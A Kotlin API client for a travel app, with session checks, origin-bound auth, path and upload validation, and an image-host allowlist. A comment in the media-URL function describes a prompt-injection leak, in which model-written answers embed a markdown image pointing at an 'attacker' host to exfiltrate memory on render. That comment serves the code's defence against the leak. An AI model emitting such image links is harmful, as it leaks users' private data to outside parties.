package com.tongyou.travel.data

import com.tongyou.travel.UrlPolicy
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.serialization.json.*
import okhttp3.*
import okhttp3.HttpUrl.Companion.toHttpUrl
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

val wireJson = Json { ignoreUnknownKeys = true; coerceInputValues = true }
fun JsonElement.obj() = this as? JsonObject ?: JsonObject(emptyMap())
fun JsonElement?.string() = (this as? JsonPrimitive)?.contentOrNull.orEmpty()
fun JsonElement?.bool() = (this as? JsonPrimitive)?.booleanOrNull == true
fun JsonElement?.int() = (this as? JsonPrimitive)?.intOrNull ?: 0
fun JsonElement?.array() = this as? JsonArray ?: JsonArray(emptyList())
fun jsonBody(vararg pairs: Pair<String, Any?>) = buildJsonObject {
    pairs.forEach { (key, value) -> put(key, when (value) {
        null -> JsonNull
        is JsonElement -> value
        is Boolean -> JsonPrimitive(value)
        is Number -> JsonPrimitive(value)
        else -> JsonPrimitive(value.toString())
    }) }
}

class ApiFailure(val status: Int, override val message: String) : IOException(message)

interface TravelService {
    suspend fun request(method: String, path: String, body: JsonObject? = null,
                        query: List<Pair<String, String>> = emptyList(), authenticated: Boolean = true): JsonElement
    suspend fun upload(bytes: ByteArray, mime: String): String
    /** Where a GET to this API path redirects (short invite links). Null when it does not redirect. */
    suspend fun redirect(path: String): String? = null
}

/** Discards work queued by a screen after its account has changed. */
class SessionService(private val delegate: TravelService, private val expected: String, private val current: () -> String?) : TravelService {
    private fun checkSession() { if (current() != expected) throw kotlinx.coroutines.CancellationException("Session changed") }
    override suspend fun request(method: String, path: String, body: JsonObject?, query: List<Pair<String, String>>, authenticated: Boolean): JsonElement {
        checkSession()
        val result = delegate.request(method, path, body, query, authenticated)
        checkSession()
        return result
    }
    override suspend fun upload(bytes: ByteArray, mime: String): String {
        checkSession(); val result = delegate.upload(bytes, mime); checkSession(); return result
    }
    override suspend fun redirect(path: String): String? { checkSession(); return delegate.redirect(path) }
}

/** Auth is attached only to this client's fixed API origin, never to media or redirects. */
class TravelApi(
    private val token: () -> String?,
    private val unauthorized: (String) -> Unit,
    private val client: OkHttpClient = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(35, TimeUnit.SECONDS).callTimeout(45, TimeUnit.SECONDS)
        .followRedirects(false).followSslRedirects(false).build(),
    private val base: HttpUrl = "${UrlPolicy.ORIGIN}/travel/api/".toHttpUrl()
) : TravelService {
    override suspend fun request(method: String, path: String, body: JsonObject?, query: List<Pair<String, String>>, authenticated: Boolean): JsonElement {
        require(!path.contains(":") && !path.startsWith('/') && !path.split('/').contains(".."))
        val url = base.newBuilder().addPathSegments(path).apply { query.forEach { addQueryParameter(it.first, it.second) } }.build()
        val request = Request.Builder().url(url).header("Accept", "application/json")
            .method(method, if (method in listOf("GET", "HEAD")) null else (body ?: JsonObject(emptyMap())).toString().toRequestBody(JSON))
        return execute(request, if (authenticated) token() else null)
    }

    override suspend fun upload(bytes: ByteArray, mime: String): String {
        require(bytes.size <= 10 * 1024 * 1024) { "图片不能超过 10 MB" }
        require(mime in setOf("image/jpeg", "image/png", "image/webp", "image/gif")) { "只支持 JPG / PNG / GIF / WebP" }
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("file", "image.${mime.substringAfter('/')}", bytes.toRequestBody(mime.toMediaType())).build()
        return execute(Request.Builder().url(base.newBuilder().addPathSegment("uploads").build()).post(body), token()).obj()["id"].string()
            .ifEmpty { throw ApiFailure(0, "上传未返回图片编号，请重试") }
    }

    override suspend fun redirect(path: String): String? {
        require(!path.contains(":") && !path.startsWith('/') && !path.split('/').contains(".."))
        val request = Request.Builder().url(base.newBuilder().addPathSegments(path).build()).get().build()
        return suspendCancellableCoroutine { continuation ->
            val call = client.newCall(request)
            continuation.invokeOnCancellation { call.cancel() }
            call.enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) { if (continuation.isActive) continuation.resumeWithException(ApiFailure(0, "网络不可用，请检查后重试")) }
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        if (it.code == 404) continuation.resumeWithException(ApiFailure(404, "链接无效或已被关闭"))
                        else continuation.resume(it.header("Location").takeIf { _ -> it.isRedirect })
                    }
                }
            })
        }
    }

    private suspend fun execute(builder: Request.Builder, sentToken: String?): JsonElement {
        if (!sentToken.isNullOrEmpty()) builder.header("Authorization", "Bearer $sentToken")
        val response = suspendCancellableCoroutine<Response> { continuation ->
            val call = client.newCall(builder.build())
            continuation.invokeOnCancellation { call.cancel() }
            call.enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    if (continuation.isActive) continuation.resumeWithException(ApiFailure(0, "网络不可用，请检查后重试"))
                }
                override fun onResponse(call: Call, response: Response) {
                    continuation.resume(response) { _, value, _ -> value.close() }
                }
            })
        }
        // Body reads also run off the main thread in callers (repository / ViewModel).
        response.use {
            val raw = it.body?.string().orEmpty()
            val value = runCatching { wireJson.parseToJsonElement(raw) }.getOrNull()
            if (it.code == 401 && sentToken != null) unauthorized(sentToken)
            if (!it.isSuccessful) {
                val detail = value?.obj()?.get("detail")
                val message = (detail as? JsonPrimitive)?.contentOrNull
                    ?: detail.array().firstOrNull()?.obj()?.get("msg").string().ifEmpty {
                        when (it.code) { 401 -> "登录已过期，请重新登录"; 409 -> "上一轮还在进行中"; else -> "请求失败（${it.code}），请稍后重试" }
                    }
                throw ApiFailure(it.code, message)
            }
            return value ?: if (it.code == 204) JsonNull else throw ApiFailure(0, "返回内容无法读取，请稍后重试")
        }
    }

    companion object {
        private val JSON = "application/json; charset=utf-8".toMediaType()
        fun media(path: String): String? {
            if (path.isBlank()) return null
            if (path.startsWith("/api/")) return UrlPolicy.ORIGIN + "/travel" + path
            if (path.startsWith('/') && !path.startsWith("//")) return UrlPolicy.ORIGIN + path
            if (UrlPolicy.external(path)) {
                val host = path.toHttpUrl().host
                if (listOf("autonavi.com", "amap.com", "c-ctrip.com", "tripcdn.com", "xhscdn.com").any { host == it || host.endsWith(".$it") })
                    return "${UrlPolicy.ORIGIN}/travel/api/img".toHttpUrl().newBuilder().addQueryParameter("u", path).build().toString()
                // Anything else is refused, not loaded directly. Answers are written by a model that has read
                // untrusted pages: `![](https://attacker/?d=<memory>)` would leak on render. The web client is
                // protected by CSP (img-src 'self'); a native image loader has no such policy, so the rule lives here.
                return null
            }
            return null
        }
    }
}
